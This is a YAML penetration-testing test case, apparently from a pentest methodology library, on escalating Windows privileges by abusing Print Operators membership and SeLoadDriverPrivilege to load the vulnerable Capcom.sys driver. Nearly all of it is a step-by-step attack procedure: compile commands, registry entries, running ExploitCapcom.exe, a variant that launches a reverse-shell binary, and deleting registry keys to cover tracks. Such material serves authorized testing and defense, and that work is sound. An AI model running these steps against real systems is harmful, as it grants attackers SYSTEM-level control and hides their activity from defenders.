---
testcase: Exploiting PrintOperators Group and SeLoadDriverPrivilege via Malicious Driver Loading
platforms:
  - AD
  - Windows
methodology:
  - BlackBox
  - GreyBox
references:
  - https://notes.dollarboysushil.com/windows-privilege-escalation/group-privileges/print-operators
how-to-test: |
  **Compilation and Preparation:**
  1. Compile the Privilege Enabler:
     - Run: `cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`
  2. Download and configure Capcom.sys:
     - Add registry entries:
       - `reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"`
       - `reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1`
  3. Confirm the driver isn't already loaded:
     - Run: `.\DriverView.exe /stext drivers.txt`
     - Filter output: `cat drivers.txt | Select-String -pattern Capcom`
  
  **Enabling and Exploitation:**
  4. Enable SeLoadDriverPrivilege:
     - Execute: `EnableSeLoadDriverPrivilege.exe`
     - Check privileges: `whoami /priv`
  5. Verify Capcom.sys is loaded:
     - Run: `.\DriverView.exe /stext drivers.txt`
     - Filter output: `cat drivers.txt | Select-String -pattern Capcom`
  6. Exploit Capcom.sys to escalate privileges:
     - Run: `.\ExploitCapcom.exe`
     
     **Alternate Exploitation (No GUI):**
     - Modify `ExploitCapcom.cpp`:
       - Replace:
         `TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");`
       - With:
         `TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");`
     - Recompile and run the tool.
  
  **Optional Automation:**
  7. Automate using EoPLoadDriver:
     - Run: `EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys`
  
  **Cleanup:**
  8. Remove the registry keys to cover your tracks:
     - Execute: `reg delete HKCU\System\CurrentControlSet\CAPCOM`
---